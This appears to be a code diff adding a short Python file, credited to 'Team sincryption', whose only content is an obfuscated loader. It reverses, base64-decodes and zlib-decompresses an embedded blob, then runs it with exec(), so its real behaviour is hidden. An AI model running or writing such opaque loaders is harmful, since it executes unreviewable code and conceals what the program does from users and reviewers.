@@ -1,0 +1,3 @@
+# Team sincryption
+# Encrypted by samay ! 
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==wr8iDIB8/v/+DIFP8sPkry5WGlLoKPoZ5zugLv13ii1K0qcorqdz3S8XVpgMRA3pIDa5WwUntBJkoR6WAYtSBeAGHHfNV2cBYzNZAPuzU6QCttT2dpU1z05br/h+VvqlqftFvlOuAsKjXEJiqOPFQWePlXK5ZU0I4lLGSswbiPmrMsf2zUF2oIbGOkGPddttODveHa3owiouaxK7NlTei2C1+cY/NhpfqtE6kclhLpnXKz0RDz8V+ZEWLgVHiQWyzOtzlAc7Iygz8bkzIPO+tt1TiWrEx4I8KO4yh41Hp0dC4mTA70j2bAsn+sSfcSK6l+vEsMW5jkEUrwxurUxIeU9zSsd2cIqUCGjOw73yqe+YVNzkdBTuExQB581qWm3EV7baaGqyZENmwZdSBXncNDFqZ+pi2d0zdXYz9Yt4x/2NVoZt/o666By+egbMLV0nPdFIMljLO5snFNoRynIpZ4U8zpLg20n8MeDvmjKD3wkv9KAHyNedbYgy1prp7rEUlQ9epAMQMzcM8QnV8VB9iwcHpyd26VpxxS6NzXCX283IxcL6SUThnM/93Pk0z+8jjeJl1L3pf/LVKNwMBvcXAFhkWBQwSxBmCoweeGPDNAAAjqWecwFwJe'))
